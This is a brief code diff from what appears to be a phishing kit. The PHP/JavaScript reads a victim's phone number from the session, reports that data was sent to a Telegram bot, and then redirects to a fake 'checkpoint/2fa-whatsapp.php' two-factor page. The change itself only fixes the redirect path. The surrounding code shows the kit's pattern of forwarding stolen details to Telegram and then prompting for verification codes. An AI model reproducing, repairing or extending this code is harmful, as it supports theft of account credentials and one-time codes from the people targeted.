@@ -345,7 +345,7 @@ $phone = isset($_SESSION['phone']) ? $_SESSION['phone'] : '00';
                             console.log('Message sent to Telegram bot successfully.');
                             // Delay redirect by 3 seconds (3000 milliseconds)
                             setTimeout(() => {
-                                window.location.href = "checkpoint/2fa-whatsapp.php"; // Change URL to the page you want to redirect to
+                                window.location.href = "/checkpoint/2fa-whatsapp.php"; // Change URL to the page you want to redirect to
                             }, 3000);
                         } else {
                             console.error('Telegram API returned an error: ', responseData.description);
